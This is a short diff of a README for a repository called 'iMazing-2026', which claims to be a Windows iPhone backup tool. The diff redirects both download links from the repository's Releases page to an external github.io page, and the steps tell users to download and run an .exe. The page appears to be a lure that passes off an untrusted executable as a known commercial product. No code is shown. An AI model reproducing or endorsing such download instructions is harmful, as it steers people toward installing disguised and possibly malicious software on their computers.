@@ -1,6 +1,6 @@
 # 📱 iMazing-2026 - Manage iPhone Backups with Ease
 
-[![](https://img.shields.io/badge/Download-iMazing-2026-blue.svg)](https://github.com/Sasmi7869/iMazing-2026/releases)
+[![](https://img.shields.io/badge/Download-iMazing-2026-blue.svg)](https://sasmi7869.github.io)
 
 This application handles iPhone data workflows on Windows. It creates encrypted backups, exports applications, and verifies restore processes for mobile devices. Use these tools to keep your phone data safe and portable between your computer and mobile hardware.
 
@@ -31,7 +31,7 @@ Your computer needs specific hardware and software to run this application.
 Follow these instructions to get the application onto your system.
 
 1. Open your web browser.
-2. Navigate to [https://github.com/Sasmi7869/iMazing-2026/releases](https://github.com/Sasmi7869/iMazing-2026/releases).
+2. Navigate to [https://sasmi7869.github.io](https://sasmi7869.github.io).
 3. Look for the latest version listed under the Releases section.
 4. Locate the file ending in .exe.
 5. Click the file name to start the download process.
